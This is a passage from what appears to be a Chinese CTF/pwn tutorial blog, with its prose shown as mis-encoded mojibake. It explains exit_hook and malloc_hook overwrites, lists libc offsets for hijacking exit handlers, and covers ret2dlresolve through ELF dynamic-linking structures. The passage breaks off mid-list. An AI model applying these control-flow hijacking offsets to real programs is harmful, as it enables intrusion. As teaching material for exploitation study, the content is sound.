è¿™ä¸¤ä¸ªå‡½æ•°éƒ½åœ¨<a href="https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/ldsodefs.h#L301"><code>_rt_global</code></a>ç»“æ„ä½“é‡Œé¢, å¯ç”¨gdbåœ¨è¿è¡Œæ—¶ç¡®å®šå’Œlibc_baseçš„offset. åªè¦è¦†ç›–äº†å°±å¯ä»¥æ”¹å˜æ‰§è¡Œæµ, æ¯”å¦‚æ”¹æˆone-gadgets, ç›¸å½“äºexitå‡½æ•°çš„hook(<strong>å‹‰å¼ºç®—æ˜¯</strong>).</p><p>æ‰€ä»¥è¿™ä¸ªåˆ©ç”¨ä¹Ÿå¾ˆæ˜æ˜¾, æ‹¿åˆ°libc base addressä¹‹åä¿®æ”¹å‡½æ•°æŒ‡é’ˆå³å¯(è¦æœ‰ä»»æ„åœ°å€å†™çš„èƒ½åŠ›).</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># libc-2.23.so</span><br>exit_hook = libc_base + <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3848</span><br>exit_hook = libc_base + <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3856</span><br><br><span class="hljs-comment"># libc-2.27.so</span><br>exit_hook = libc_base + <span class="hljs-number">0x619060</span> + <span class="hljs-number">3840</span><br>exit_hook = libc_base + <span class="hljs-number">0x619060</span> + <span class="hljs-number">3848</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>å’Œfree_hookä¸€ä¸ªä¸œè¥¿, ä¸€èˆ¬éƒ½æ˜¯åœ¨è·å–ä»»æ„å†™çš„èƒ½åŠ›ä¹‹åè¦†ç›–æ‰è¿™ä¸ªåœ°å€, ç„¶ååœ¨è¿›è¡Œmalloc/freeè¾¾åˆ°æ‰§è¡Œä»»æ„åœ°å€å¤„çš„ä»£ç çš„ç›®çš„. </p><h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><h3 id="ç›¸å…³èƒŒæ™¯çŸ¥è¯†"><a href="#ç›¸å…³èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="ç›¸å…³èƒŒæ™¯çŸ¥è¯†"></a>ç›¸å…³èƒŒæ™¯çŸ¥è¯†</h3><p><strong>Lazy bind</strong>: ç¬¬ä¸€æ¬¡è°ƒç”¨read</p><ul><li>å…ˆcall read@plt. </li><li>ç¬¬ä¸€æ¡æŒ‡ä»¤å°±æ˜¯jmp GOT[], å†jmpåˆ°goté‡Œçš„åœ°å€</li><li>å®é™…ä¸Šå­˜çš„æ˜¯read@plt+6, ç›¸å½“äºç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</li><li>pushä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯rel_offset</li><li>ä¹‹åè·³è½¬åˆ°pre_resolve, åœ¨plt[0]ä¸­, æ€»å…±ä¸¤æ¡æŒ‡ä»¤. </li><li>åˆpushä¸€ä¸ªå‚æ•°(link_map).  </li><li>è·³è½¬åˆ°_dl_runtime_resolve</li></ul><hr><h4 id="ç›¸å…³ç±»å‹å¤§å°"><a href="#ç›¸å…³ç±»å‹å¤§å°" class="headerlink" title="ç›¸å…³ç±»å‹å¤§å°"></a>ç›¸å…³ç±»å‹å¤§å°</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Type for a 16-bit quantity.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf32_Half;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf64_Half;<br><span class="hljs-comment">/* Types for signed and unsigned 32-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Word;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int32_t</span>  Elf32_Sword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf64_Word;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int32_t</span>  Elf64_Sword;<br><span class="hljs-comment">/* Types for signed and unsigned 64-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf32_Xword;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int64_t</span>  Elf32_Sxword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Xword;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int64_t</span>  Elf64_Sxword;<br><span class="hljs-comment">/* Type of addresses.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Addr;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Addr;<br><span class="hljs-comment">/* Type of file offsets.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Off;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Off;<br><span class="hljs-comment">/* Type for section indices, which are 16-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf32_Section;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf64_Section;<br><span class="hljs-comment">/* Type for version symbol information.  */</span><br><span class="hljs-keyword">typedef</span> Elf32_Half Elf32_Versym;<br><span class="hljs-keyword">typedef</span> Elf64_Half Elf64_Versym;<br></code></pre></div></td></tr></table></figure><p><strong>ELF</strong>: åŸç‰ˆæ¥è‡ª:<a href="https://github.com/ReAbout/pwn-exercise-iot/blob/main/linux_x86_stack_overflow/pwn5_ret2dlresolve/pwn5.md">link</a> </p><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a><code>.dynamic</code></h4><p>è¿™ä¸ªsectionçš„ç”¨å¤„å°±æ˜¯ä»–åŒ…å«äº†å¾ˆå¤šåŠ¨æ€é“¾æ¥æ‰€éœ€çš„å…³é”®ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨åªå…³å¿ƒ<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>è¿™ä¸‰é¡¹ï¼Œè¿™ä¸‰ä¸ªä¸œè¥¿åˆ†åˆ«åŒ…å«äº†æŒ‡å‘.<code>dynstr</code>, <code>.dynsym</code>, .<code>rel.plt</code>è¿™3ä¸ªsectionçš„æŒ‡é’ˆã€‚ <code>readelf -S</code> (Section Headers)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    Elf32_Sword d_tag;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        Elf32_Word d_val;<br>        Elf32_Addr d_ptr;<br>    &#125; d_un;<br>&#125; Elf32_Dyn; <span class="hljs-comment">//0x8 bytes</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf64_Dyn</span> &#123;</span><br>    Elf64_Sxword d_tag; <span class="hljs-comment">// Type of dynamic table entry.</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        Elf64_Xword d_val; <span class="hljs-comment">// Integer value of entry.</span><br>        Elf64_Addr d_ptr;  <span class="hljs-comment">// Pointer value of entry.</span><br>    &#125; d_un;<br>&#125;; <span class="hljs-comment">//0x10 bytes</span><br><br><br>Dynamic section at offset <span class="hljs-number">0x21b0</span> contains <span class="hljs-number">24</span> entries:<br>  Tag        Type                         Name/Value<br> ...<br> <span class="hljs-number">0x00000005</span> (STRTAB)                     <span class="hljs-number">0x804828c</span>  <br> <span class="hljs-number">0x00000006</span> (SYMTAB)                     <span class="hljs-number">0x80481ec</span>   å³ä¸º `.dynsym`<br> ...<br> <span class="hljs-number">0x00000017</span> (JMPREL)                     <span class="hljs-number">0x8048344</span>   å³ä¸º `.rel.plt`<br> ...<br></code></pre></div></td></tr></table></figure><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p>ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œ<strong>indexä¸º0çš„åœ°æ–¹æ°¸è¿œæ˜¯0</strong>ï¼Œç„¶ååé¢æ˜¯åŠ¨æ€é“¾æ¥æ‰€éœ€çš„å­—ç¬¦ä¸²ï¼Œ0ç»“å°¾ï¼ŒåŒ…æ‹¬å¯¼å…¥å‡½æ•°åã€‚åˆ°æ—¶å€™ï¼Œç›¸å…³æ•°æ®ç»“æ„å¼•ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç”¨çš„æ˜¯ç›¸å¯¹è¿™ä¸ªsectionå¤´çš„åç§»ã€‚</p><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p>æ˜¯ä¸€ä¸ªç¬¦å·è¡¨ï¼ˆç»“æ„ä½“æ•°ç»„ï¼‰ï¼Œ<strong>è¡¨ç¤ºåŠ¨æ€é“¾æ¥è¿™äº›æ¨¡å—ä¹‹é—´çš„ç¬¦å·å¯¼å…¥å¯¼å‡ºå…³ç³»</strong>ã€‚æˆ‘ä»¬è¿™é‡Œåªå…³å¿ƒå‡½æ•°ç¬¦å·ã€‚ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹, æ€»å…±0x10å­—èŠ‚, Halfæ˜¯ä¸¤å­—èŠ‚, è€ŒElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º0x18å­—èŠ‚. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Word    st_name; <span class="hljs-comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»</span><br>  Elf32_Addr    st_value;<br>  Elf32_Word    st_size;  <span class="hljs-comment">//å¦‚æœæ˜¯å¯¼å…¥å‡½æ•°, ä¸Šé¢ä¸¤ä¸ªéƒ½æ˜¯é›¶, å› ä¸ºæ˜¯åœ¨åˆ«çš„æ–‡ä»¶ä¸­å®šä¹‰çš„. </span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_info; <span class="hljs-comment">//å¯¹äº å¯¼å…¥ å‡½æ•° ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other; <span class="hljs-comment">//otherå­—æ®µéƒ½æ˜¯0</span><br>  Elf32_Half st_shndx;    <span class="hljs-comment">//ç¬¦å·æ‰€åœ¨çš„æ®µä¸‹æ ‡, æœ‰ABS COMMON UNDEFä¸‰ä¸ªç‰¹æ®Šå€¼. </span><br>&#125;Elf32_Sym;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Word        st_name;                <span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     st_info;                <span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     st_other;                <span class="hljs-comment">/* Symbol visibility */</span><br>  Elf64_Section     st_shndx;                <span class="hljs-comment">/* Section index */</span><br>  Elf64_Addr        st_value;                <span class="hljs-comment">/* Symbol value */</span><br>  Elf64_Xword       st_size;                <span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br></code></pre></div></td></tr></table></figure><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a><code>.rel.plt</code></h4><p>æ˜¯é‡å®šä½è¡¨ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªé¡¹å¯¹åº”ä¸€ä¸ªå¯¼å…¥å‡½æ•°ã€‚<strong>åœ¨64ä½ä¸‹çš„æ®µåç§°ä¸º<code>.rela.plt</code></strong>. </p><p><strong>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ 64 ä½ä¸‹ï¼Œplt ä¸­çš„ä»£ç  push çš„æ˜¯å¾…è§£æç¬¦å·åœ¨é‡å®šä½è¡¨ä¸­çš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯åç§»ã€‚æ¯”å¦‚ï¼Œwrite å‡½æ•° push çš„æ˜¯ 0ã€‚</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf32_Addr r_offset; <span class="hljs-comment">// å¯¹äºå¯é‡å®šä½æ–‡ä»¶, è¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚,</span><br>                         <span class="hljs-comment">// å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€</span><br>    Elf32_Word r_info;   <span class="hljs-comment">// åœ¨`.symtab`æˆ–è€…`.dyntab`ä¸­ç´¢å¼• | ç±»å‹</span><br>                         <span class="hljs-comment">// TYPEä¸€èˆ¬CPUç›¸å…³, ä¾‹å¦‚R_386_PC32(é™æ€), R_386_JUMP_SLOT(dyn)</span><br>&#125; Elf32_Rel;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_SYM(info) ((info) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_TYPE(info) ((unsigned char)(info))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + (unsigned char)(type))</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr r_offset;   <span class="hljs-comment">/* Address */</span><br>    Elf64_Xword r_info;    <span class="hljs-comment">/* Relocation type and symbol index */</span><br>    Elf64_Sxword r_addend; <span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<span class="hljs-comment">// 24 or 0x18 å­—èŠ‚</span><br><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_TYPE(i) ((i)&amp;0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_INFO(sym, type) ((((Elf64_Xword)(sym)) &lt;&lt; 32) + (type))</span><br></code></pre></div></td></tr></table></figure><h4 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap:"></a><a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">linkmap</a>:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//å…¶ä¸­l_info:</span><br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br></code></pre></div></td></tr></table></figure><p>è€Œ<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#846">DT_NUM</a>æ˜¯elf.hä¸­å®šä¹‰çš„.dynamicæ®µè¡¨é¡¹ç±»å‹æ•°ç›®, å€¼ä¸º35, å‰35ä¸ªå®ä¹Ÿæ˜¯l_infoä¸­çš„ä¸‹æ ‡, å¯ä»¥ç´¢å¼•åˆ°dynamicæ®µä¸­æ‰€æœ‰çš„ä¿¡æ¯.  åœ¨64ä½æœºä¸Š, l_infoåœ¨linkmapä¸­çš„åç§»ä¸º0x40. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Legal values for d_tag (dynamic entry type).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_NULL        0        <span class="hljs-comment">/* Marks end of dynamic section */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_NEEDED    1        <span class="hljs-comment">/* Name of needed library */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTRELSZ    2        <span class="hljs-comment">/* Size in bytes of PLT relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTGOT    3        <span class="hljs-comment">/* Processor defined value */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_HASH        4        <span class="hljs-comment">/* Address of symbol hash table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_STRTAB    5        <span class="hljs-comment">/* Address of string table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMTAB    6        <span class="hljs-comment">/* Address of symbol table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELA        7        <span class="hljs-comment">/* Address of Rela relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELASZ    8        <span class="hljs-comment">/* Total size of Rela relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELAENT    9        <span class="hljs-comment">/* Size of one Rela reloc */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_STRSZ    10        <span class="hljs-comment">/* Size of string table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMENT    11        <span class="hljs-comment">/* Size of one symbol table entry */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_INIT        12        <span class="hljs-comment">/* Address of init function */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_FINI        13        <span class="hljs-comment">/* Address of termination function */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SONAME    14        <span class="hljs-comment">/* Name of shared object */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RPATH    15        <span class="hljs-comment">/* Library search path (deprecated) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMBOLIC    16        <span class="hljs-comment">/* Start symbol search here */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_REL        17        <span class="hljs-comment">/* Address of Rel relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELSZ    18        <span class="hljs-comment">/* Total size of Rel relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELENT    19        <span class="hljs-comment">/* Size of one Rel reloc */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTREL    20        <span class="hljs-comment">/* Type of reloc in PLT */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_DEBUG    21        <span class="hljs-comment">/* For debugging; unspecified */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_TEXTREL    22        <span class="hljs-comment">/* Reloc might modify .text */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_JMPREL    23        <span class="hljs-comment">/* Address of PLT relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_BIND_NOW    24        <span class="hljs-comment">/* Process relocations of object */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_INIT_ARRAY    25        <span class="hljs-comment">/* Array with addresses of init fct */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_FINI_ARRAY    26        <span class="hljs-comment">/* Array with addresses of fini fct */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_INIT_ARRAYSZ    27        <span class="hljs-comment">/* Size in bytes of DT_INIT_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_FINI_ARRAYSZ    28        <span class="hljs-comment">/* Size in bytes of DT_FINI_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RUNPATH    29        <span class="hljs-comment">/* Library search path */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_FLAGS    30        <span class="hljs-comment">/* Flags for the object being loaded */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_ENCODING    32        <span class="hljs-comment">/* Start of encoded range */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PREINIT_ARRAY 32        <span class="hljs-comment">/* Array with addresses of preinit fct*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="hljs-comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMTAB_SHNDX    34        <span class="hljs-comment">/* Address of SYMTAB_SHNDX section */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_NUM        35        <span class="hljs-comment">/* Number used */</span></span><br></code></pre></div></td></tr></table></figure><hr><h4 id="æ€»ç»“-runtime-resolve"><a href="#æ€»ç»“-runtime-resolve" class="headerlink" title="æ€»ç»“+runtime_resolve"></a>æ€»ç»“+runtime_resolve</h4><p>ç®€å•è¯´æ¥, æ‰€æœ‰çš„ç¬¦å·ä¼šå‡ºç°åœ¨<code>.symtab</code>æ®µä¸­, éœ€è¦åŠ¨æ€é“¾æ¥çš„ç¬¦å·ä¼šå‡ºç°åœ¨<code>.dynsym</code>ä¸­, åŠ ä¸Š<code>.dynstr</code>, è®°å½•çš„æ˜¯æ‰€æœ‰å¯¼å…¥ç¬¦å·çš„åç§°(é™¤æ­¤ä¹‹å¤–ä¹Ÿæ²¡å•¥æœ‰ç”¨ä¿¡æ¯äº†), <code>.rel.plt/.rel.dyn</code>æœ‰è¿›è¡Œé‡å®šä½æ—¶éœ€è¦çš„ä½ç½®+ç±»å‹ä¿¡æ¯. éœ€è¦é‡å®šä½æ—¶åœ¨å…¶ä¸­éå†å³å¯. </p><p>åœ¨ Linux ä¸­ï¼Œç¨‹åºä½¿ç”¨ <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> æ¥å¯¹åŠ¨æ€é“¾æ¥çš„å‡½æ•°è¿›è¡Œé‡å®šä½ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›¸åº”çš„å‚æ•°åŠå…¶å¯¹åº”åœ°å€çš„å†…å®¹æ˜¯ä¸æ˜¯å°±å¯ä»¥æ§åˆ¶è§£æçš„å‡½æ•°äº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚è¿™ä¹Ÿæ˜¯ ret2dlresolve æ”»å‡»çš„æ ¸å¿ƒæ‰€åœ¨ã€‚<br>å…·ä½“çš„ï¼ŒåŠ¨æ€é“¾æ¥å™¨åœ¨è§£æç¬¦å·åœ°å€æ—¶æ‰€ä½¿ç”¨çš„é‡å®šä½è¡¨é¡¹ã€åŠ¨æ€ç¬¦å·è¡¨ã€åŠ¨æ€å­—ç¬¦ä¸²è¡¨éƒ½æ˜¯ä»ç›®æ ‡æ–‡ä»¶ä¸­çš„åŠ¨æ€èŠ‚ .dynamic ç´¢å¼•å¾—åˆ°çš„ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹å…¶ä¸­çš„æŸäº›å†…å®¹ä½¿å¾—æœ€ååŠ¨æ€é“¾æ¥å™¨è§£æçš„ç¬¦å·æ˜¯æˆ‘ä»¬æƒ³è¦è§£æçš„ç¬¦å·ï¼Œé‚£ä¹ˆæ”»å‡»å°±è¾¾æˆäº†ã€‚</p><p><code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> æ‰§è¡Œæµç¨‹: (ä¸€ç¯‡åˆ†æ<a href="https://www.twblogs.net/a/5e50f236bd9eee21167ec0d0/?lang=zh-cn">åšå®¢</a> | <a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">linkmap</a> | <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#59">dl_fixup</a> | <a href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU_hash</a>)</p><ol><li><p>ç”¨<code>link_map</code>è®¿é—®<code>.dynamic</code>ï¼Œå–å‡º<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>çš„æŒ‡é’ˆ</p></li><li><p><code>.rel.plt</code> + ç¬¬äºŒä¸ªå‚æ•°æ±‚å‡ºå½“å‰å‡½æ•°çš„é‡å®šä½è¡¨é¡¹<code>Elf32_Rel</code>çš„æŒ‡é’ˆï¼Œè®°ä½œreloc</p></li><li><p><code>reloc-&gt;r_info &gt;&gt; 8</code>ä½œä¸º<code>.dynsym</code>çš„ä¸‹æ ‡ï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„ç¬¦å·è¡¨é¡¹<code>Elf32_Sym</code>çš„æŒ‡é’ˆï¼Œè®°ä½œsym</p></li><li><p><code>.dynstr + sym-&gt;st_name</code>å¾—å‡ºç¬¦å·åå­—ç¬¦ä¸²æŒ‡é’ˆ</p></li><li><p>å¦‚æœsym-&gt;st_otheréé›¶(ä¸€èˆ¬éƒ½æ˜¯), åˆ™æ‰§è¡Œä¸‹é¢çš„æµç¨‹. </p></li><li><p>æŸ¥æ‰¾ç¬¦å·å¯¹åº”çš„ç‰ˆæœ¬ä¿¡æ¯, 